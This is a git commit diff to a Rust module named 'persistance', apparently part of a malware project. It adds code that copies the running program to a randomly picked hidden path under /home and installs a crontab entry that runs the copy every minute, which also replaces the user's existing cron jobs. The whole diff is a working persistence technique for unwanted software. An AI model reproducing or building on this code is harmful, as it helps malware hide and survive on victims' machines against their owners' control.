090bfe5c5982158d859b2ce96ba7d05b901efeca
proxin187 <thugshaker627@gmail.com>
2025-01-14 22:03:03 +0100

    feat: random persistance path

--- src/persistance/mod.rs
+++ src/persistance/mod.rs
@@ -1,28 +1,44 @@
 use std::process::Command;
 use std::path::PathBuf;
 use std::io::Write;
+use std::env;
 use std::fs;
 
 use log::{info, warn};
+use rand::seq::SliceRandom;
 
 
 pub struct Persistance {
-    paths: Vec<PathBuf>,
+    path: PathBuf,
 }
 
 impl Persistance {
     pub fn new() -> Persistance {
+        let mut path = rand_subpath(PathBuf::from("/home"));
+
+        path.push(format!("lprs_{:x?}", rand::random::<u64>()));
+
         Persistance {
-            paths: descent(&[PathBuf::from("/")]),
+            path,
         }
+    }
+
+    fn duplicate(&self) -> Result<u64, Box<dyn std::error::Error>> {
+        let from = env::current_exe()?;
+
+        fs::copy(from, &self.path).map_err(|err| err.into())
     }
 
     pub fn install(&mut self) -> Result<(), Box<dyn std::error::Error>> {
         let mut process = Command::new("/usr/bin/crontab").spawn()?;
 
+        self.duplicate()?;
+
         match process.stdin.take() {
             Some(mut stdin) => {
-                stdin.write_all(b"* * * * * /dev/disk/by-partuuid/3hxr47")?;
+                if let Some(path) = self.path.to_str() {
+                    stdin.write_all(format!("* * * * * {}", path).as_bytes())?;
+                }
 
                 info!("successfully set crontab");
             },
@@ -35,26 +51,28 @@ impl Persistance {
     }
 }
 
-pub fn descent(paths: &[PathBuf]) -> Vec<PathBuf> {
-    let (dirs, files): (Vec<PathBuf>, Vec<PathBuf>) = paths.iter().cloned().partition(|path| path.is_dir());
+pub fn rand_subpath(path: PathBuf) -> PathBuf {
+    let mut rng = rand::thread_rng();
 
-    let next = dirs.iter()
-        .filter_map(|dir| {
-            fs::read_dir(dir)
-                .map(|read| read.filter_map(|entry| entry.ok().map(|entry| entry.path())).collect::<Vec<PathBuf>>())
-                .map(|paths| descent(&paths))
-                .ok()
-        })
-        .flatten()
-        .collect::<Vec<PathBuf>>();
+    match fs::read_dir(&path) {
+        Ok(dir) => {
+            let subdirs = dir.into_iter()
+                .filter_map(|entry| entry.ok().and_then(|entry| entry.path().is_dir().then(|| entry.path())))
+                .collect::<Vec<PathBuf>>();
 
-    [files, next].concat()
+            match subdirs.choose(&mut rng) {
+                Some(path) => rand_subpath(path.clone()),
+                None => path,
+            }
+        },
+        Err(_) => path,
+    }
 }
 
 pub fn init() {
     let persistance = Persistance::new();
 
-    info!("paths: {:#?}", persistance.paths);
+    info!("path: {:#?}", persistance.path);
 }
 
 
